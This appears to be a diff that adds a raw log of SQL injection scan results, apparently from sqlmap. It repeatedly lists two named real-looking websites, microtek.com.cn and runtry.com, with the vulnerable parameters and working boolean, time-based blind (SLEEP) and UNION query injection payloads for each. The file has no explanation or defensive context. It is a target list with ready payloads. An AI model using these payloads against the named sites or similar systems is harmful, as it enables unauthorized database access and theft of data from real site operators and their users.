@@ -1,0 +1,1600 @@
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
